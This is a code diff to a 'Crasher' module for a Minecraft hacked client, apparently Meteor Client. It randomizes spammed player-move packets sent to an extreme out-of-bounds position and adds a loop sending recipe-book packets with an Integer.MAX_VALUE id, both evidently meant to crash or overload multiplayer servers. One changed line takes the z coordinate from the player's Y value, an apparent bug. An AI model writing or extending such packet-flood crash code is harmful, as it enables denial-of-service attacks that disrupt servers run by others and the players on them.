@@ -8,6 +8,8 @@ import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
 import net.minecraft.network.packet.c2s.play.*;
+import net.minecraft.recipe.NetworkRecipeId;
+import java.util.Random;
 
 public class Crasher extends Module {
     private final SettingGroup sgGeneral = settings.createGroup("General");
@@ -120,9 +122,10 @@ public class Crasher extends Module {
         }
 
         if (spamPos.get()) {
-            double x = mc.player.getX();
-            double y = -10000;
-            double z = mc.player.getZ();
+            Random random = new Random();
+            double x = mc.player.getX() + random.nextDouble();
+            double y = -10000 + random.nextDouble();
+            double z = mc.player.getY() + random.nextDouble();
             float yaw = mc.player.getYaw();
             float pitch = mc.player.getPitch();
             handler.sendPacket(new PlayerMoveC2SPacket.Full(x, y, z, yaw, pitch, true, false));
@@ -138,7 +141,8 @@ public class Crasher extends Module {
 
         if (devCrash.get()) {
             for (int i = 0; i < 19; i++) {
-//                handler.sendPacket(new ());
+                NetworkRecipeId networkRecipeId = new NetworkRecipeId(Integer.MAX_VALUE);
+                handler.sendPacket(new RecipeBookDataC2SPacket(networkRecipeId));
             }
         }
 
